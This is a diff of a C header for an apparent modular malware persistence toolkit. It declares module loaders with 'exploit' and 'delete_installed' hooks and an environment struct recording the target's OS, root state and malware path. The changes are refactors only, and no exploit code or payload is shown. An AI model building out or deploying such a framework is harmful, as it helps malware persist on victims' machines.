@@ -6,28 +6,20 @@
 
 	#ifdef __linux__
 		#define                 TARGET_OPERAING_SYSTEM              LINUX
-		#define                 MODULES_FOLDER                      "modules/linux"
 		#define                 MODULE_EXTENSION                    ".so"
 	#elif _WIN32
 		#define                 TARGET_OPERAING_SYSTEM              WINDOWS
-		#define                 MODULES_FOLDER                      "modules/windows"
 		#define                 MODULE_EXTENSION                    ".dll"
 	#else
 		#error Platform not supported
 	#endif
 
 	#define                 MAX_MODULES                         32
-
-	#define                 FUNC_NAME_CHECK_COMPATIBILIY        "check_compatibility"
+	#define                 MODULES_FOLDER                      "build/modules"
+	#define                 FUNC_NAME_IS_COMPATIBLE             "is_compatible"
 	#define                 FUNC_NAME_EXPLOIT                   "exploit"
-	#define                 FUNC_NAME_CHECK_INSTALLED           "check_installed"
+	#define                 FUNC_NAME_IS_INSTALLED              "is_installed"
 	#define                 FUNC_NAME_DELETE_INSTALLED          "delete_installed"
-
-#pragma endregion
-
-#pragma region TypeDefs
-
-	typedef                 int (*MODULE_FUNC)(void);
 
 #pragma endregion
 
@@ -55,7 +47,18 @@
 		ARCHITECTURE architecture;
 		ROOTED_STATE is_root;
 		char *malware_path;
+		char *working_directory;
 	} ENVIRONMENT;
+
+#pragma endregion
+
+#pragma region TypeDefs
+
+	typedef                 int (*MODULE_FUNC)(ENVIRONMENT *);
+
+#pragma endregion
+
+#pragma region Enumerations
 
 	typedef struct{
 		int count;
@@ -65,15 +68,19 @@
 	typedef struct{
 		char *name;
 		void *handle;
-		MODULE_FUNC check_compatibility;
+		MODULE_FUNC is_compatible;
 		MODULE_FUNC exploit;
-		MODULE_FUNC check_installed;
+		MODULE_FUNC is_installed;
 		MODULE_FUNC delete_installed;
 	} LOADED_MODULE;
 
 #pragma
 
+
 #pragma region ExportedFunctions
+
+
+	#pragma region Environment
 
 	/**
 	 * @brief Set the environment of the targetted machine and the used malware
@@ -82,19 +89,19 @@
 	 * @param os The operating system of the machine
 	 * @param arch The architecture of the machine
 	 * @param is_root True if the attacher has root on machine
-	 * @param path_to_malware Path to the malware that need to gain persistency
+	 * @param abs_path_to_malware Absolute path to the malware that need to gain persistency
 	 * @return int Zero if success, non-zero if error
 	 */
-	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *path_to_malware);
+	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware);
 
 	/**
 	 * @brief Automatically set the machine details
 	 * 
 	 * @param env The environment object that will be setted
-	 * @param path_to_malware Path to the malware that need to gain persistency
+	 * @param abs_path_to_malware Absolute path to the malware that need to gain persistency
 	 * @return int Zero if success, non-zero if error
 	 */
-	int autoset_environment(ENVIRONMENT **env, const char *path_to_malware);
+	int autoset_environment(ENVIRONMENT **env, const char *abs_path_to_malware);
 
 	/**
 	 * @brief Free the already setted environment
@@ -103,6 +110,10 @@
 	 * @return int Zero if success, non-zero if error
 	 */
 	int free_environment(ENVIRONMENT **env);
+
+	#pragma endregion
+
+	#pragma region ModuleWallet
 
 	/**
 	 * @brief Get the all modules from the local setup
@@ -120,12 +131,16 @@
 	 */
 	int free_module_wallet(MODULE_WALLET **wallet);
 
+	#pragma endregion
+
+	#pragma region Module
+
 	/**
 	 * @brief Verify if a module is installed in the toolkit
 	 * 
 	 * @param wallet The module wallet, preloaded with all the modules
 	 * @param name The name of the module that will be 
-	 * @return bool Negative if not found and positive(or zero) if found, more exactly the index in the wallet
+	 * @return int Negative if not found and positive(or zero) if found, more exactly the index in the wallet
 	 */
 	int is_module_present(MODULE_WALLET *wallet, const char *name);
 
@@ -145,6 +160,8 @@
 	 * @return int Zero if success, non-zero if error
 	 */
 	int unlink_module(LOADED_MODULE **module);
+
+	#pragma endregion
 
 #pragma endregion
 
